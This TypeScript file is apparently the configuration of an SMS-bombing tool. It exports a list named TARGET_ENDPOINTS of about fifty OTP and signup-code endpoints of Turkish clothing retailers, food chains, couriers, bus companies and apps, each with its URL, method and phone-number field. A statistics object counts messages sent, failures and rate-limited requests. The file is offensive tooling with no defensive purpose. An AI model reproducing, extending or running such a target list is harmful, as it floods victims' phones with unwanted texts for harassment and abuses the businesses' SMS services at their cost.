import { ServiceDefinition } from './types';

export const TARGET_ENDPOINTS: ServiceDefinition[] = [
  // --- GİYİM DEVLERİ (High Traffic) ---
  { 
    id: 'lc_waikiki', 
    name: 'LC Waikiki', 
    url: 'https://api.lcwaikiki.com/api/User/SendOtp', 
    method: 'POST', 
    payloadInfo: '{"PhoneNumber": "..."}'
  },
  { 
    id: 'defacto', 
    name: 'DeFacto', 
    url: 'https://api.defacto.com.tr/Authentication/SendOtp', 
    method: 'POST', 
    payloadInfo: '{"MobilePhone": "..."}'
  },
  { 
    id: 'koton', 
    name: 'Koton', 
    url: 'https://www.koton.com/users/register/', 
    method: 'POST', 
    payloadInfo: '{"mobile": "..."}'
  },
  { 
    id: 'mavi', 
    name: 'Mavi', 
    url: 'https://global-api.mavi.com/api/v1/users/otp', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'boyner', 
    name: 'Boyner', 
    url: 'https://mobile-api.boyner.com.tr/api/v1/auth/register/otp', 
    method: 'POST', 
    payloadInfo: '{"gsm": "..."}'
  },
  { 
    id: 'flo', 
    name: 'FLO', 
    url: 'https://api.flo.com.tr/v1/user/login/otp', 
    method: 'POST', 
    payloadInfo: '{"mobile": "..."}'
  },
  { 
    id: 'in_street', 
    name: 'In Street', 
    url: 'https://api.instreet.com.tr/v1/auth/sms', 
    method: 'POST', 
    payloadInfo: '{"mobile": "..."}'
  },
  { 
    id: 'korayspor', 
    name: 'Korayspor', 
    url: 'https://api.korayspor.com/auth/login', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'penti', 
    name: 'Penti', 
    url: 'https://api.penti.com/api/v1/users/login/otp', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },

  // --- MARKET & EV ---
  { 
    id: 'migros_money', 
    name: 'Migros Money', 
    url: 'https://www.money.com.tr/Account/ValidateAndSendOTP', 
    method: 'POST', 
    payloadInfo: 'Form: gsm=...'
  },
  { 
    id: 'file_market', 
    name: 'File Market', 
    url: 'https://api.filemarket.com.tr/v1/otp/send', 
    method: 'POST', 
    payloadInfo: '{"mobilePhoneNumber": "90..."}'
  },
  { 
    id: 'bim_market', 
    name: 'Bim Market', 
    url: 'https://bim.veesk.net/service/v1.0/account/login', 
    method: 'POST', 
    payloadInfo: '{"msisdn": "90..."}'
  },
  { 
    id: 'english_home', 
    name: 'English Home', 
    url: 'https://www.englishhome.com/api/member/sendOtp', 
    method: 'POST', 
    payloadInfo: '{"Phone": "...", "Source": "WEB"}'
  },
  { 
    id: 'evidea', 
    name: 'Evidea', 
    url: 'https://www.evidea.com/users/register/', 
    method: 'POST', 
    payloadInfo: 'Multipart: sms_allowed=true, phone=...'
  },
  { 
    id: 'wmf', 
    name: 'WMF', 
    url: 'https://www.wmf.com.tr/users/register/', 
    method: 'POST', 
    payloadInfo: 'Multipart Form: confirm=true, phone=...'
  },
  { 
    id: 'hayat_su', 
    name: 'Hayat Su', 
    url: 'https://api.hayatsu.com.tr/api/SignUp/SendOtp', 
    method: 'POST', 
    payloadInfo: 'Form: mobilePhoneNumber=...'
  },
  { 
    id: 'metro_market', 
    name: 'Metro Market', 
    url: 'https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend', 
    method: 'POST', 
    payloadInfo: '{"methodType": "2", "mobilePhoneNumber": "..."}'
  },

  // --- YEMEK & İÇECEK ---
  { 
    id: 'tikla_gelsin', 
    name: 'Tikla Gelsin', 
    url: 'https://svc.apps.tiklagelsin.com/user/graphql', 
    method: 'POST', 
    payloadInfo: 'GraphQL: GENERATE_OTP'
  },
  { 
    id: 'kahve_dunyasi', 
    name: 'Kahve Dunyasi', 
    url: 'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number', 
    method: 'POST', 
    payloadInfo: '{"countryCode": "90", "phoneNumber": "..."}'
  },
  { 
    id: 'starbucks', 
    name: 'Starbucks', 
    url: 'https://api.starbucks.com.tr/auth/register/otp', 
    method: 'POST', 
    payloadInfo: '{"mobile": "..."}'
  },
  { 
    id: 'burger_king', 
    name: 'Burger King', 
    url: 'https://api.burgerking.com.tr/auth/login', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'popeyes', 
    name: 'Popeyes', 
    url: 'https://api.popeyes.com.tr/auth/otp', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'arbys', 
    name: 'Arbys', 
    url: 'https://api.arbys.com.tr/auth/login', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'usta_donerci', 
    name: 'Usta Donerci', 
    url: 'https://api.ustadonerci.com/auth/otp', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'dominos', 
    name: 'Dominos', 
    url: 'https://frontend.dominos.com.tr/api/customer/sendOtpCode', 
    method: 'POST', 
    payloadInfo: '{"mobilePhone": "..."}'
  },
  { 
    id: 'little_caesars', 
    name: 'Little Caesars', 
    url: 'https://api.littlecaesars.com.tr/api/web/Member/Register', 
    method: 'POST', 
    payloadInfo: '{"Phone": "05...", "NameSurname": "..."}'
  },
  { 
    id: 'pasaport_pizza', 
    name: 'Pasaport Pizza', 
    url: 'https://api.pasaportpizza.com/user/login', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'baydoner', 
    name: 'Baydoner', 
    url: 'https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp', 
    method: 'POST', 
    payloadInfo: '{"Gsm": "..."}'
  },
  { 
    id: 'kofteci_yusuf', 
    name: 'Kofteci Yusuf', 
    url: 'https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder', 
    method: 'POST', 
    payloadInfo: '{"Telefon": "..."}'
  },
  { 
    id: 'komagene', 
    name: 'Komagene', 
    url: 'https://gateway.komagene.com.tr/auth/auth/smskodugonder', 
    method: 'POST', 
    payloadInfo: '{"Telefon": "..."}'
  },
  { 
    id: 'coffy', 
    name: 'Coffy', 
    url: 'https://user-api-gw.coffy.com.tr/user/signup', 
    method: 'POST', 
    payloadInfo: '{"phoneNumber": "..."}'
  },

  // --- ULAŞIM & KARGO ---
  { 
    id: 'marti', 
    name: 'Marti', 
    url: 'https://api.marti.tech/api/v1/authentication/start', 
    method: 'POST', 
    payloadInfo: '{"mobile_number": "..."}'
  },
  { 
    id: 'binbin', 
    name: 'BinBin', 
    url: 'https://api.binbin.tech/auth/login', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'yurtici_kargo', 
    name: 'Yurtici Kargo', 
    url: 'https://api.yurticikargo.com/auth/login', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'aras_kargo', 
    name: 'Aras Kargo', 
    url: 'https://customer.araskargo.com.tr/auth/otp', 
    method: 'POST', 
    payloadInfo: '{"msisdn": "90..."}'
  },
  { 
    id: 'mng_kargo', 
    name: 'MNG Kargo', 
    url: 'https://api.mngkargo.com.tr/bireysel/auth', 
    method: 'POST', 
    payloadInfo: '{"tel": "..."}'
  },
  { 
    id: 'surat_kargo', 
    name: 'Surat Kargo', 
    url: 'https://api.suratkargo.com.tr/auth/login', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'ido', 
    name: 'IDO', 
    url: 'https://api.ido.com.tr/idows/v2/register', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'kamil_koc', 
    name: 'Kamil Koc', 
    url: 'https://api.kamilkoc.com.tr/auth/otp', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'pamukkale', 
    name: 'Pamukkale', 
    url: 'https://api.pamukkale.com.tr/user/login', 
    method: 'POST', 
    payloadInfo: '{"mobile": "..."}'
  },
  { 
    id: 'metro_turizm', 
    name: 'Metro Turizm', 
    url: 'https://api.metroturizm.com.tr/auth/sms', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },

  // --- DİĞER ---
  { 
    id: 'yapp', 
    name: 'Yapp', 
    url: 'https://yapp.com.tr/api/mobile/v1/register', 
    method: 'POST', 
    payloadInfo: '{"phone_number": "..."}'
  },
  { 
    id: 'suiste', 
    name: 'Suiste', 
    url: 'https://suiste.com/api/auth/code', 
    method: 'POST', 
    payloadInfo: '{"gsm": "..."}'
  },
  { 
    id: 'porty', 
    name: 'Porty', 
    url: 'https://panel.porty.tech/api.php', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'kim_gb_ister', 
    name: 'Kim GB Ister', 
    url: 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp', 
    method: 'POST', 
    payloadInfo: '{"msisdn": "90..."}'
  },
  { 
    id: '345_dijital', 
    name: '345 Dijital', 
    url: 'https://api.345dijital.com/api/users/register', 
    method: 'POST', 
    payloadInfo: '{"phoneNumber": "+90..."}'
  },
  { 
    id: 'beefull', 
    name: 'Beefull', 
    url: 'https://app.beefull.io/api/inavitas-access-management/sms-login', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'naosstars', 
    name: 'Naosstars', 
    url: 'https://api.naosstars.com/api/smsSend', 
    method: 'POST', 
    payloadInfo: '{"telephone": "+90..."}'
  },
  { 
    id: 'akasya_avm', 
    name: 'Akasya AVM', 
    url: 'https://akasyaapi.poilabs.com/v1/en/sms', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'dr_store', 
    name: 'D&R', 
    url: 'https://api.dr.com.tr/auth/login/otp', 
    method: 'POST', 
    payloadInfo: '{"mobile": "..."}'
  },
  { 
    id: 'kitapyurdu', 
    name: 'Kitapyurdu', 
    url: 'https://api.kitapyurdu.com/auth/sms', 
    method: 'POST', 
    payloadInfo: '{"mobile": "..."}'
  },
  { 
    id: 'bkm_kitap', 
    name: 'BKM Kitap', 
    url: 'https://api.bkmkitap.com/auth/login', 
    method: 'POST', 
    payloadInfo: '{"phone": "..."}'
  },
  { 
    id: 'cineverse', 
    name: 'Paribu Cineverse', 
    url: 'https://api.paribucineverse.com/auth/otp', 
    method: 'POST', 
    payloadInfo: '{"mobile": "..."}'
  }
];

export const INITIAL_STATS = {
  totalSent: 0,
  success: 0,
  failed: 0,
  rateLimited: 0,
  sentOpaque: 0,
};